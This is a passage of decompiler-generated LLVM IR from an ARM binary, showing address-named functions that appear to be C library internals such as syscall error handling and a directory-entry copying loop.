  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1a9dc, { 1, 0 }
  uselistorder label %dec_label_pc_1a97c, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1a8c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a8bc, { 1, 0 }
  uselistorder label %dec_label_pc_1a8b8, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1aae0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1aae0:
  %v0_1aae0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1aae0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1aae0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1aae0, %bb
  %v10_1aaf4 = phi i32 [ %arg1, %dec_label_pc_1aae0 ], [ 0, %bb ]
  ret i32 %v10_1aaf4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_1aaf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1aaf8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 180260, i32* %r2.global-to-local, align 4
  %v4_1ab04 = load i32, i32* inttoptr (i32 180368 to i32*), align 16
  %v4_1ab0c = load i32, i32* inttoptr (i32 180328 to i32*), align 8
  store i32 %v4_1ab0c, i32* %r1.global-to-local, align 4
  %v1_1ab10 = add i32 %arg1, 44
  %v2_1ab10 = inttoptr i32 %v1_1ab10 to i32*
  %v3_1ab10 = load i32, i32* %v2_1ab10, align 4
  %v1_1ab14 = add i32 %arg1, 28
  %v2_1ab14 = inttoptr i32 %v1_1ab14 to i32*
  %v3_1ab14 = load i32, i32* %v2_1ab14, align 4
  store i32 %v3_1ab14, i32* %r2.global-to-local, align 4
  %v2_1ab18 = inttoptr i32 %v4_1ab04 to i32*
  store i32 %v3_1ab10, i32* %v2_1ab18, align 4
  %v0_1ab1c = load i32, i32* %r2.global-to-local, align 4
  %v1_1ab1c = load i32, i32* %r1.global-to-local, align 4
  %v2_1ab1c = inttoptr i32 %v1_1ab1c to i32*
  store i32 %v0_1ab1c, i32* %v2_1ab1c, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1ab28(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ab28:
  %v0_1ab28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ab28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1ab28
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1ab28, %bb
  %v4_1ab2c = phi i32 [ %arg1, %dec_label_pc_1ab28 ], [ 0, %bb ]
  ret i32 %v4_1ab2c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1ab30(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ab6c:
  store i32 180260, i32* @r2, align 4
  store i32 %arg1, i32* @global_var_32ac8.943, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_32ac8.943, { 1, 0, 2 }
}

define i32 @function_1ab78(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ab78:
  %v0_1ab78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ab78, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_1ab78
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_1ab78, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_1ab88() local_unnamed_addr {
dec_label_pc_1ab88:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_1()
  %tmp4 = call i16 @__decompiler_undefined_function_1()
  %tmp5 = call i16 @__decompiler_undefined_function_1()
  %tmp6 = call i16 @__decompiler_undefined_function_1()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %v3_1ab88 = load i32, i32* @r7, align 4
  %v6_1ab88 = load i32, i32* @lr, align 4
  %v2_1ab8c = ptrtoint i32* %stack_var_-72 to i32
  %v0_1ab90 = load i32, i32* @r1, align 4
  store i32 %v0_1ab90, i32* @r3, align 4
  store i32 %v2_1ab8c, i32* %r1.global-to-local, align 4
  %v0_1aba0 = load i32, i32* @r0, align 4
  store i32 %v0_1aba0, i32* %r7.global-to-local, align 4
  %tmp32 = icmp ult i32 %v0_1aba0, -4095
  br i1 %tmp32, label %dec_label_pc_1abc0, label %dec_label_pc_1abac

dec_label_pc_1abac:                               ; preds = %dec_label_pc_1ab88
  %v0_1abac = call i32 @function_12b24()
  %v0_1abb0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1abb0 = sub i32 0, %v0_1abb0
  store i32 %v1_1abb0, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1abb8 = inttoptr i32 %v0_1abac to i32*
  store i32 %v1_1abb0, i32* %v2_1abb8, align 4
  %v0_1abd0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1abd0

dec_label_pc_1abc0:                               ; preds = %dec_label_pc_1ab88
  %v2_1abc0 = icmp eq i32 %v0_1aba0, 0
  store i32 109520, i32* %lr.global-to-local, align 4
  br i1 %v2_1abc0, label %dec_label_pc_1ad58, label %dec_label_pc_1abd0

dec_label_pc_1abd0:                               ; preds = %dec_label_pc_1abc0, %dec_label_pc_1abac
  %v0_1abd0 = phi i32 [ %v0_1abd0.pre, %dec_label_pc_1abac ], [ %v0_1aba0, %dec_label_pc_1abc0 ]
  store i32 %v3_1ab88, i32* @r7, align 4
  store i32 %v6_1ab88, i32* @lr, align 4
  ret i32 %v0_1abd0

dec_label_pc_1ad58:                               ; preds = %dec_label_pc_1abc0
  %v3_1ad58 = load i32, i32* @r4, align 4
  %v6_1ad58 = load i32, i32* @r5, align 4
  %v9_1ad58 = load i32, i32* @r6, align 4
  %v15_1ad58 = load i32, i32* @r8, align 4
  %v18_1ad58 = load i32, i32* @sb, align 4
  store i32 %v0_1ab90, i32* %r5.global-to-local, align 4
  store i32 %v2_1ab8c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1ad74 = inttoptr i32 %v0_1ab90 to i8*
  %v3_1ad74 = call i32 @function_13ed0(i8* %v2_1ad74, i32 0)
  %v2_1ad7c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1ad7c, i32* %r8.global-to-local, align 4
  %v1_1ad80 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ad80 = add i32 %v1_1ad80, 12
  %v3_1ad80 = inttoptr i32 %v2_1ad80 to i32*
  %v1_1ad8c = load i32, i32* %r5.global-to-local, align 4
  %v2_1ad8c = add i32 %v1_1ad8c, 44
  %v3_1ad8c = inttoptr i32 %v2_1ad8c to i32*
  %v1_1ad94 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ad94 = add i32 %v1_1ad94, 48
  %v3_1ad94 = inttoptr i32 %v2_1ad94 to i32*
  %v1_1ad9c = load i32, i32* %r5.global-to-local, align 4
  %v2_1ad9c = add i32 %v1_1ad9c, 52
  %v3_1ad9c = inttoptr i32 %v2_1ad9c to i32*
  %v0_1ada8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ada8 = add i32 %v0_1ada8, 56
  %v1_1adac = inttoptr i32 %v1_1ada8 to i32*
  %v3_1adac = add i32 %v0_1ada8, 60
  %v4_1adac = inttoptr i32 %v3_1adac to i32*
  %v5_1adac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1adac, i32* %v4_1adac, align 4
  %v0_1adb8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1adb8 = add i32 %v0_1adb8, 64
  %v1_1adbc = inttoptr i32 %v1_1adb8 to i32*
  %v3_1adbc = add i32 %v0_1adb8, 68
  %v4_1adbc = inttoptr i32 %v3_1adbc to i32*
  %v5_1adbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1adbc, i32* %v4_1adbc, align 4
  %v4_1adc8 = zext i16 %tmp6 to i32
  store i32 %v4_1adc8, i32* %r2.global-to-local, align 4
  %v4_1adcc = zext i16 %tmp5 to i32
  store i32 %v4_1adcc, i32* %ip.global-to-local, align 4
  %v4_1add0 = zext i16 %tmp4 to i32
  store i32 %v4_1add0, i32* %lr.global-to-local, align 4
  %v4_1add4 = zext i16 %tmp to i32
  store i32 %v4_1add4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1ade0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ade0 = add i32 %v0_1ade0, 72
  store i32 %v1_1ade0, i32* @r3, align 4
  %v1_1ade4 = inttoptr i32 %v1_1ade0 to i32*
  store i32 %tmp28, i32* %v1_1ade4, align 4
  %v3_1ade4 = add i32 %v0_1ade0, 76
  %v4_1ade4 = inttoptr i32 %v3_1ade4 to i32*
  %v5_1ade4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ade4, i32* %v4_1ade4, align 4
  %v0_1ade8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ade8 = inttoptr i32 %v0_1ade8 to i32*
  %v2_1ade8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1ade8, i32* %v1_1ade8, align 4
  %v3_1ade8 = add i32 %v0_1ade8, 4
  %v4_1ade8 = inttoptr i32 %v3_1ade8 to i32*
  %v5_1ade8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1ade8, i32* %v4_1ade8, align 4
  %v0_1adec = load i32, i32* %r6.global-to-local, align 4
  %v1_1adec = load i32, i32* %r5.global-to-local, align 4
  %v2_1adec = add i32 %v1_1adec, 32
  %v3_1adec = inttoptr i32 %v2_1adec to i32*
  store i32 %v0_1adec, i32* %v3_1adec, align 4
  %v0_1adf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1adf0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1adf0 = add i32 %v1_1adf0, 36
  %v3_1adf0 = inttoptr i32 %v2_1adf0 to i32*
  store i32 %v0_1adf0, i32* %v3_1adf0, align 4
  %v0_1adf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1adf4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1adf4 = add i32 %v1_1adf4, 16
  %v3_1adf4 = inttoptr i32 %v2_1adf4 to i32*
  store i32 %v0_1adf4, i32* %v3_1adf4, align 4
  %v0_1adf8 = load i32, i32* %ip.global-to-local, align 4
  %v1_1adf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1adf8 = add i32 %v1_1adf8, 20
  %v3_1adf8 = inttoptr i32 %v2_1adf8 to i32*
  store i32 %v0_1adf8, i32* %v3_1adf8, align 4
  %v0_1adfc = load i32, i32* %lr.global-to-local, align 4
  %v1_1adfc = load i32, i32* %r5.global-to-local, align 4
  %v2_1adfc = add i32 %v1_1adfc, 24
  %v3_1adfc = inttoptr i32 %v2_1adfc to i32*
  store i32 %v0_1adfc, i32* %v3_1adfc, align 4
  %v0_1ae00 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ae00 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae00 = add i32 %v1_1ae00, 28
  %v3_1ae00 = inttoptr i32 %v2_1ae00 to i32*
  store i32 %v0_1ae00, i32* %v3_1ae00, align 4
  store i32 %v3_1ad58, i32* @r4, align 4
  store i32 %v6_1ad58, i32* @r5, align 4
  store i32 %v9_1ad58, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v15_1ad58, i32* @r8, align 4
  store i32 %v18_1ad58, i32* @sb, align 4
  store i32 109520, i32* @lr, align 4
  ret i32 %tmp28

; uselistorder directives
  uselistorder i32 %v0_1aba0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1ab90, { 1, 0, 2 }
  uselistorder i32 %tmp28, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0 }
  uselistorder i32 72, { 5, 0, 1, 2, 8, 3, 6, 7, 4 }
  uselistorder i32 60, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 88, { 1, 0 }
}

define i32 @function_1ae10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1ae10:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1ae44, label %dec_label_pc_1ae34

dec_label_pc_1ae34:                               ; preds = %dec_label_pc_1ae10
  %v0_1ae34 = call i32 @function_12b24()
  %v0_1ae38 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ae38 = sub i32 0, %v0_1ae38
  %v2_1ae3c = inttoptr i32 %v0_1ae34 to i32*
  store i32 %v1_1ae38, i32* %v2_1ae3c, align 4
  br label %dec_label_pc_1ae44

dec_label_pc_1ae44:                               ; preds = %dec_label_pc_1ae10, %dec_label_pc_1ae34
  %v1_1ae4c = phi i32 [ %arg1, %dec_label_pc_1ae10 ], [ -1, %dec_label_pc_1ae34 ]
  ret i32 %v1_1ae4c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ae44, { 1, 0 }
}

define i32 @function_1ae50(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1ae50:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1ae54 = load i32, i32* @r4, align 4
  %v6_1ae54 = load i32, i32* @r5, align 4
  %v12_1ae54 = load i32, i32* @r7, align 4
  %v1_1ae58 = add i32 %arg3, 14
  %v2_1ae60 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1ae64 = and i32 %v1_1ae58, -8
  %v2_1ae68 = sub i32 %v2_1ae60, %v1_1ae64
  %v1_1ae6c = add i32 %v2_1ae68, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1ae6c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1aea8, label %dec_label_pc_1ae94

dec_label_pc_1ae94:                               ; preds = %dec_label_pc_1ae50
  %v0_1ae94 = call i32 @function_12b24()
  %v0_1ae98 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ae98 = sub i32 0, %v0_1ae98
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1aea0 = inttoptr i32 %v0_1ae94 to i32*
  store i32 %v1_1ae98, i32* %v2_1aea0, align 4
  %v0_1aeb0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1aeb0

dec_label_pc_1aea8:                               ; preds = %dec_label_pc_1ae50
  br i1 false, label %dec_label_pc_1aeb0, label %dec_label_pc_1aeb8

dec_label_pc_1aeb0:                               ; preds = %dec_label_pc_1aea8, %dec_label_pc_1ae94
  %v0_1aeb0 = phi i32 [ -1, %dec_label_pc_1aea8 ], [ %v0_1aeb0.pre, %dec_label_pc_1ae94 ]
  store i32 %v0_1aeb0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af84

dec_label_pc_1aeb8:                               ; preds = %dec_label_pc_1aea8
  %v2_1aeb8 = add i32 %v1_1ae6c, %arg1
  %v2_1aebc = add i32 %tmp, %arg3
  store i32 %v2_1aebc, i32* @ip, align 4
  store i32 %v1_1ae6c, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1af6c

dec_label_pc_1aed8:                               ; preds = %dec_label_pc_1af6c
  %v1_1aed8 = add i32 %v0_1af2c, 16
  %v2_1aed8 = inttoptr i32 %v1_1aed8 to i16*
  %v3_1aed8 = load i16, i16* %v2_1aed8, align 2
  %v4_1aed8 = zext i16 %v3_1aed8 to i32
  %v1_1aedc = add nuw nsw i32 %v4_1aed8, 7
  %v1_1aee0 = and i32 %v1_1aedc, 131064
  store i32 %v1_1aee0, i32* %r2.global-to-local, align 4
  %v2_1aee8 = add i32 %v1_1aee0, %v0_1af34
  store i32 %v2_1aee8, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1aee8, %v2_1aebc
  br i1 %tmp26, label %dec_label_pc_1aef4, label %dec_label_pc_1af28

dec_label_pc_1aef4:                               ; preds = %dec_label_pc_1aed8
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1aefc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1aefc, i32* %r2.global-to-local, align 4
  %v0_1af00 = load i32, i32* %sl.global-to-local, align 4
  %v1_1af04 = load i32, i32* @sp, align 4
  %v2_1af04 = inttoptr i32 %v1_1af04 to i32*
  store i32 0, i32* %v2_1af04, align 4
  %v4_1af08 = call i32 @function_1cca4(i32 %arg1, i32 0, i32 %v0_1aefc, i32 %v0_1af00)
  %v0_1af0c = load i32, i32* @r5, align 4
  %v1_1af0c = load i32, i32* %r6.global-to-local, align 4
  %v9_1af0c = icmp eq i32 %v0_1af0c, %v1_1af0c
  br i1 %v9_1af0c, label %dec_label_pc_1af14, label %dec_label_pc_1af80

dec_label_pc_1af14:                               ; preds = %dec_label_pc_1aef4
  %v0_1af14 = call i32 @function_12b24()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1af20 = inttoptr i32 %v0_1af14 to i32*
  store i32 22, i32* %v2_1af20, align 4
  %v0_1af84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af84

dec_label_pc_1af28:                               ; preds = %dec_label_pc_1aed8
  %v1_1af28 = inttoptr i32 %v0_1af2c to i32*
  %v2_1af28 = load i32, i32* %v1_1af28, align 4
  %v3_1af28 = add i32 %v0_1af2c, 4
  %v4_1af28 = inttoptr i32 %v3_1af28 to i32*
  %v5_1af28 = load i32, i32* %v4_1af28, align 4
  store i32 %v5_1af28, i32* %r4.global-to-local, align 4
  %v1_1af2c = add i32 %v0_1af2c, 8
  store i32 %v1_1af2c, i32* %sb.global-to-local, align 4
  %v1_1af30 = inttoptr i32 %v1_1af2c to i32*
  %v2_1af30 = load i32, i32* %v1_1af30, align 4
  store i32 %v2_1af30, i32* %sb.global-to-local, align 4
  %v3_1af30 = add i32 %v0_1af2c, 12
  %v4_1af30 = inttoptr i32 %v3_1af30 to i32*
  %v5_1af30 = load i32, i32* %v4_1af30, align 4
  store i32 %v5_1af30, i32* %sl.global-to-local, align 4
  %v1_1af34 = inttoptr i32 %v0_1af34 to i32*
  store i32 %v2_1af28, i32* %v1_1af34, align 4
  %v3_1af34 = add i32 %v0_1af34, 4
  %v4_1af34 = inttoptr i32 %v3_1af34 to i32*
  %v5_1af34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1af34, i32* %v4_1af34, align 4
  %v0_1af38 = load i32, i32* @r7, align 4
  %v1_1af38 = add i32 %v0_1af38, 8
  %v1_1af3c = inttoptr i32 %v1_1af38 to i32*
  %v2_1af3c = load i32, i32* %v1_1af3c, align 4
  %v3_1af3c = add i32 %v0_1af38, 12
  %v4_1af3c = inttoptr i32 %v3_1af3c to i32*
  %v5_1af3c = load i32, i32* %v4_1af3c, align 4
  store i32 %v5_1af3c, i32* @r4, align 4
  %v1_1af40 = load i32, i32* @r5, align 4
  %v2_1af40 = add i32 %v1_1af40, 8
  %v3_1af40 = inttoptr i32 %v2_1af40 to i32*
  store i32 %v2_1af3c, i32* %v3_1af40, align 4
  %v0_1af44 = load i32, i32* @r4, align 4
  %v1_1af44 = load i32, i32* @r5, align 4
  %v2_1af44 = add i32 %v1_1af44, 12
  %v3_1af44 = inttoptr i32 %v2_1af44 to i32*
  store i32 %v0_1af44, i32* %v3_1af44, align 4
  %v0_1af48 = load i32, i32* %r2.global-to-local, align 4
  %v1_1af48 = trunc i32 %v0_1af48 to i16
  %v2_1af48 = load i32, i32* @r5, align 4
  %v3_1af48 = add i32 %v2_1af48, 16
  %v4_1af48 = inttoptr i32 %v3_1af48 to i16*
  store i16 %v1_1af48, i16* %v4_1af48, align 2
  %v0_1af4c = load i32, i32* @r7, align 4
  %v1_1af4c = add i32 %v0_1af4c, 18
  %v2_1af4c = inttoptr i32 %v1_1af4c to i8*
  %v3_1af4c = load i8, i8* %v2_1af4c, align 1
  %v4_1af4c = zext i8 %v3_1af4c to i32
  store i32 %v4_1af4c, i32* @r3, align 4
  %v2_1af50 = load i32, i32* @r5, align 4
  %v3_1af50 = add i32 %v2_1af50, 18
  %v4_1af50 = inttoptr i32 %v3_1af50 to i8*
  store i8 %v3_1af4c, i8* %v4_1af50, align 1
  %v0_1af54 = load i32, i32* @r7, align 4
  %v1_1af54 = add i32 %v0_1af54, 16
  %v2_1af54 = inttoptr i32 %v1_1af54 to i16*
  %v3_1af54 = load i16, i16* %v2_1af54, align 2
  %v4_1af54 = zext i16 %v3_1af54 to i32
  %v1_1af58 = add nsw i32 %v4_1af54, -19
  store i32 %v1_1af58, i32* @r2, align 4
  %v0_1af5c = call i32 @function_14000()
  %v0_1af60 = load i32, i32* @r7, align 4
  %v1_1af60 = add i32 %v0_1af60, 16
  %v2_1af60 = inttoptr i32 %v1_1af60 to i16*
  %v3_1af60 = load i16, i16* %v2_1af60, align 2
  %v4_1af60 = zext i16 %v3_1af60 to i32
  %v0_1af64 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1af64, i32* @r5, align 4
  %v2_1af68 = add i32 %v4_1af60, %v0_1af60
  store i32 %v2_1af68, i32* @r7, align 4
  br label %dec_label_pc_1af6c

dec_label_pc_1af6c:                               ; preds = %dec_label_pc_1aeb8, %dec_label_pc_1af28
  %v0_1af34 = phi i32 [ %tmp, %dec_label_pc_1aeb8 ], [ %v0_1af64, %dec_label_pc_1af28 ]
  %v0_1af2c = phi i32 [ %v1_1ae6c, %dec_label_pc_1aeb8 ], [ %v2_1af68, %dec_label_pc_1af28 ]
  %v3_1af70 = icmp ult i32 %v0_1af2c, %v2_1aeb8
  %v1_1af74 = add i32 %v0_1af34, 19
  store i32 %v1_1af74, i32* @r0, align 4
  %v1_1af78 = add i32 %v0_1af2c, 19
  store i32 %v1_1af78, i32* @r1, align 4
  br i1 %v3_1af70, label %dec_label_pc_1aed8, label %dec_label_pc_1af80.loopexit

dec_label_pc_1af80.loopexit:                      ; preds = %dec_label_pc_1af6c
  %v0_1af80.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1af80

dec_label_pc_1af80:                               ; preds = %dec_label_pc_1af80.loopexit, %dec_label_pc_1aef4
  %v1_1af80 = phi i32 [ %v0_1af34, %dec_label_pc_1af80.loopexit ], [ %v0_1af0c, %dec_label_pc_1aef4 ]
  %v0_1af80 = phi i32 [ %v0_1af80.pre, %dec_label_pc_1af80.loopexit ], [ %v1_1af0c, %dec_label_pc_1aef4 ]
  %v2_1af80 = sub i32 %v1_1af80, %v0_1af80
  store i32 %v2_1af80, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1af84

dec_label_pc_1af84:                               ; preds = %dec_label_pc_1af14, %dec_label_pc_1aeb0, %dec_label_pc_1af80
  %v0_1af84 = phi i32 [ %v0_1af84.pre, %dec_label_pc_1af14 ], [ %v0_1aeb0, %dec_label_pc_1aeb0 ], [ %v2_1af80, %dec_label_pc_1af80 ]
  store i32 %v3_1ae54, i32* %r4.global-to-local, align 4
  store i32 %v6_1ae54, i32* @r5, align 4
  store i32 %v12_1ae54, i32* @r7, align 4
  ret i32 %v0_1af84

; uselistorder directives
  uselistorder i32 %v0_1af2c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1af34, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1ae6c, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 4, 3 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 0, 13, 14, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 14, { 3, 0, 8, 4, 5, 1, 2, 7, 6 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1af84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1af6c, { 1, 0 }
}

define i32 @function_1af94() local_unnamed_addr {
dec_label_pc_1af94:
  %v0_1afa0 = load i32, i32* @r1, align 4
  store i32 %v0_1afa0, i32* @r2, align 4
  %v0_1afa8 = call i32 @function_1afb8()
  ret i32 %v0_1afa8
}

define i32 @function_1afb8() local_unnamed_addr {
dec_label_pc_1afb8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_1afb8 = load i32, i32* @r4, align 4
  %v6_1afb8 = load i32, i32* @r5, align 4
  %v12_1afb8 = load i32, i32* @r7, align 4
  store i32 %tmp14, i32* @r7, align 4
  %v0_1afcc = load i32, i32* @r2, align 4
  store i32 %v0_1afcc, i32* %stack_var_-32, align 4
  store i32 180260, i32* %r6.global-to-local, align 4
  %v0_1afd8 = load i32, i32* @r0, align 4
  store i32 %v0_1afd8, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp14, 3
  br i1 %tmp, label %dec_label_pc_1aff4, label %dec_label_pc_1afe0

dec_label_pc_1afe0:                               ; preds = %dec_label_pc_1afb8
  %v0_1afe0 = call i32 @function_12b24()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1afec = inttoptr i32 %v0_1afe0 to i32*
  store i32 22, i32* %v2_1afec, align 4
  br label %dec_label_pc_1b0e4

dec_label_pc_1aff4:                               ; preds = %dec_label_pc_1afb8
  %v1_1aff4 = add i32 %v0_1afd8, 52
  %v2_1aff4 = inttoptr i32 %v1_1aff4 to i32*
  %v3_1aff4 = load i32, i32* %v2_1aff4, align 4
  %v1_1aff8 = sub i32 1, %v3_1aff4
  store i32 %v1_1aff8, i32* %r8.global-to-local, align 4
  %v2_1aff8 = icmp ult i32 %v3_1aff4, 2
  br i1 %v2_1aff8, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1aff4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1b040

bb:                                               ; preds = %dec_label_pc_1aff4
  %v2_1b000 = icmp eq i32 %v1_1aff8, 0
  br i1 %v2_1b000, label %dec_label_pc_1b040, label %dec_label_pc_1b008

dec_label_pc_1b008:                               ; preds = %bb
  %v1_1b00c = add i32 %v0_1afd8, 56
  store i32 %v1_1b00c, i32* @r4, align 4
  %v4_1b010 = load i32, i32* inttoptr (i32 180296 to i32*), align 8
  store i32 %v4_1b010, i32* %r1.global-to-local, align 4
  store i32 %v1_1b00c, i32* %r2.global-to-local, align 4
  %v4_1b020 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_1b020)
  %v0_1b034 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b034 = add i32 %v0_1b034, 16
  %v3_1b034 = inttoptr i32 %v2_1b034 to i32*
  %v4_1b034 = load i32, i32* %v3_1b034, align 4
  store i32 %v4_1b034, i32* @ip, align 4
  store i32 110656, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b034)
  %v0_1b040.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b040

dec_label_pc_1b040:                               ; preds = %.thread, %bb, %dec_label_pc_1b008
  %v0_1b04c = phi i32 [ %v0_1afd8, %.thread ], [ %v0_1afd8, %bb ], [ %v0_1b040.pre, %dec_label_pc_1b008 ]
  %v1_1b040 = inttoptr i32 %v0_1b04c to i16*
  %v2_1b040 = load i16, i16* %v1_1b040, align 2
  %v1_1b044 = and i16 %v2_1b040, 64
  %v2_1b044 = icmp eq i16 %v1_1b044, 0
  br i1 %v2_1b044, label %dec_label_pc_1b05c, label %dec_label_pc_1b04c

dec_label_pc_1b04c:                               ; preds = %dec_label_pc_1b040
  store i32 %v0_1b04c, i32* @r0, align 4
  %v0_1b050 = call i32 @function_12d98()
  %v2_1b054 = icmp eq i32 %v0_1b050, 0
